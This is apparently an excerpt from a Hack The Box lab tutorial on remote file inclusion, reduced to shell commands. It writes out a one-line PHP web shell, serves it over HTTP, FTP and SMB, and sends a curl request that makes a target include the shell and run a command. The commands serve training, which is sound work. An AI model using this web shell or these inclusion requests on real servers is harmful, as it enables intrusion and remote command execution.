...
```shell-session
Pangulin@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
...
```shell-session
Pangulin@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
...
```shell-session
Pangulin@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
...
```shell-session
Pangulin@htb[/htb]$ sudo python -m pyftpdlib -p 21
...
```shell-session
Pangulin@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
...
```shell-session
Pangulin@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
